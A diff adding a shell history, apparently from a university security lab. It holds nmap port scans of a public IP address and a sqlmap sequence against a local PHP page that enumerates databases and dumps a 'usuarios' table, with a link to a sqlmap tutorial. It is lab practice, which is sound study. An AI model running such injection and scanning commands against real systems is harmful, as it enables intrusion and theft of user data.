@@ -1,0 +1,32 @@
+ 1985  man nmap
+ 1986  nmap -p smtp 34.34.191.120
+ 1987  nmap -p tcp 34.34.191.120
+ 1988  nmap -p ssh 34.34.191.120
+ 1989  nmap -p ftp 34.34.191.120
+ 1990  nmap -p https 34.34.191.120
+ 1991  sudo iptables -S
+ 1992  cd Documents/vscode/SGSSI/lab10/
+ 1993  cd ..
+ 1994  git add --all
+ 1995  git commit -S -m "empezado lab10"
+ 1996  git push
+ 1997  sudo iptables -S
+ 1998  ping egela.ehu.eus
+ 1999  cd ..
+ 2000  git pull
+ 2001  sudo apt update
+ 2002  sudo apt upgrade
+ 2003  sudo apt install sqlmap
+ 2004  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 -dbs
+ 2005  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 --dbs
+ 2006  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 -D database --tables
+ 2007  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 -D database -T mytable --columns
+ 2008  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 -D database -T usuarios --columns
+ 2009  sqlmap -u http://localhost:81/ver_videojuego.php?id=2 -D database -T usuarios --columns --dump
+ 2010  sqlmap -h
+ 2011  history | tail 30
+ 2012  man tail
+ 2013  history | tail -n 30
+ 2014  history | tail -n 30 > /home/javierac/Documents/vscode/SGSSI/entrega3.txt
+ 
+ https://byte-mind.net/explotacion-de-la-vulnerabilidad-sql-injection-con-sqlmap/
